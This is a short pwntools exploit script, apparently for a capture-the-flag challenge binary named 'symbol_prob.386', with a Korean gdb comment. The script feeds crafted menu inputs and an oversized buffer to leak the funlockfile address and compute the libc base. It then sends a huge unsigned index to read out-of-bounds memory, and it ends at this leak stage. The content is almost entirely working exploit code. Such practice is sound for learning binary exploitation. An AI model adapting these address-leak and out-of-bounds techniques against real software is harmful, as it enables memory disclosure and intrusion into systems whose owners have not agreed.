from pwn import*
context.log_level = 'debug'
gdb_script = '''
# 아래 설정은 메모리를 검사할 때 기본적으로 8 바이트씩 출력하도록 합니다.
set print elements 0
set print elements 8
'''
e= ELF("./deploy/libc.so.6")
funlock_offset = e.symbols['funlockfile']
print(funlock_offset)

p = gdb.debug("./deploy/symbol_prob.386")
p.recvuntil(b">>")
p.sendline(b"1")
p.recvuntil(b">>")
p.send(b"a"*0xfff+ b"z")
p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(b"48")
p.recvuntil(b": ")
p.sendline(b"6")
p.recvuntil(b"after")
p.recvline()
funlockfile_addr = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(funlockfile_addr))
libc_base = funlockfile_addr - funlock_offset
print("libc base %x" % libc_base)

p.sendline(b"1")
p.recvuntil(b"z")
data_addr = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(data_addr))
p.recvuntil(b">>")
p.sendline(b"yee")
p.recvuntil(b">>")
p.sendline(b"2")
p.recvuntil(b": ")
p.sendline(b"18446739451025424332")
p.recvuntil(b": ")
p.sendline(b"1")
p.recvuntil(b"after")
p.recvline()

